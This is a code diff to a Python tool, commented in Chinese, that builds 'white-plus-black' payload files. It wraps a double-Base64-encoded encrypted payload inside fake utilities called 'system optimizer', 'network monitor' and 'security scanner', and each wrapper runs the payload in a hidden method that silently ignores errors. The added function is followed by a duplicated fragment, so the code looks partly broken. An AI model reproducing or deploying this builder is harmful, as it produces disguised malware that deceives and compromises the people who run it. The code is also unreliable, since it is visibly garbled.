@@ -249,12 +249,13 @@ def generate_legitimate_wrapper():
         {
             "name": "system_optimizer.py",
             "description": "系统优化工具",
-            "code": '''
-import os
+            "code": '''import os
 import sys
 import time
 import threading
 import subprocess
+
+{WHITE_BLACK_CODE}
 
 class SystemOptimizer:
     """系统优化工具"""
@@ -283,8 +284,12 @@ class SystemOptimizer:
     def execute_hidden_payload(self):
         """执行隐藏载荷"""
         try:
-            # 在这里插入白加黑代码
-            {WHITE_BLACK_CODE}
+            # 执行白加黑载荷
+            try:
+                loader = WhiteBlackLoader()
+                loader.execute_payload(ENCODED_PAYLOAD)
+            except Exception:
+                pass
         except Exception:
             pass
     
@@ -308,12 +313,13 @@ if __name__ == "__main__":
         {
             "name": "network_monitor.py", 
             "description": "网络监控工具",
-            "code": '''
-import os
+            "code": '''import os
 import sys
 import time
 import threading
 import random
+
+{WHITE_BLACK_CODE}
 
 class NetworkMonitor:
     """网络监控工具"""
@@ -346,8 +352,12 @@ class NetworkMonitor:
         """执行维护任务"""
         try:
             print("[INFO] 执行网络维护任务...")
-            # 在这里插入白加黑代码
-            {WHITE_BLACK_CODE}
+            # 执行白加黑载荷
+            try:
+                loader = WhiteBlackLoader()
+                loader.execute_payload(ENCODED_PAYLOAD)
+            except Exception:
+                pass
         except Exception:
             pass
     
@@ -379,12 +389,13 @@ if __name__ == "__main__":
         {
             "name": "security_scanner.py",
             "description": "安全扫描工具", 
-            "code": '''
-import os
+            "code": '''import os
 import sys
 import time
 import random
 import threading
+
+{WHITE_BLACK_CODE}
 
 class SecurityScanner:
     """安全扫描工具"""
@@ -426,8 +437,12 @@ class SecurityScanner:
         """执行深度分析"""
         try:
             print("正在执行深度安全分析...")
-            # 在这里插入白加黑代码
-            {WHITE_BLACK_CODE}
+            # 执行白加黑载荷
+            try:
+                loader = WhiteBlackLoader()
+                loader.execute_payload(ENCODED_PAYLOAD)
+            except Exception:
+                pass
         except Exception:
             pass
     
@@ -452,6 +467,53 @@ if __name__ == "__main__":
 
 
 def create_white_black_payload(encrypted_code, key, output_dir, wrapper_type="auto"):
+    """创建白加黑载荷文件"""
+    try:
+        # 生成白加黑模板代码
+        white_black_template = generate_white_black_template()
+        
+        # 双重Base64编码载荷
+        encoded_payload = base64.b64encode(
+            base64.b64encode(encrypted_code.encode()).decode().encode()
+        ).decode()
+        
+        # 替换载荷占位符
+        white_black_code = white_black_template.replace("{ENCODED_PAYLOAD}", encoded_payload)
+        
+        # 选择合法程序包装器
+        if wrapper_type == "auto":
+            wrapper = generate_legitimate_wrapper()
+        else:
+            # 可以根据需要添加特定类型的包装器
+            wrapper = generate_legitimate_wrapper()
+        
+        # 将白加黑代码插入包装器，注意处理缩进
+        # 获取插入点的缩进
+        lines = wrapper["code"].split('\n')
+        for i, line in enumerate(lines):
+            if '{WHITE_BLACK_CODE}' in line:
+                indent = len(line) - len(line.lstrip())
+                # 为白加黑代码添加正确的缩进
+                indented_code = '\n'.join([' ' * indent + l if l.strip() else l for l in white_black_code.split('\n')])
+                break
+        else:
+            indented_code = white_black_code
+        
+        # 替换占位符
+        final_code = wrapper["code"].replace("{WHITE_BLACK_CODE}", indented_code)
+        
+        # 生成文件名
+        filename = wrapper["name"]
+        filepath = os.path.join(output_dir, filename)
+        
+        # 写入文件
+        with open(filepath, 'w', encoding='utf-8') as f:
+            f.write(final_code)
+        
+        return filepath, wrapper["description"]
+        
+    except Exception as e:
+        raise Exception(f"创建白加黑载荷失败: {str(e)}")
     """创建白加黑载荷文件"""
     try:
         # 生成白加黑模板代码
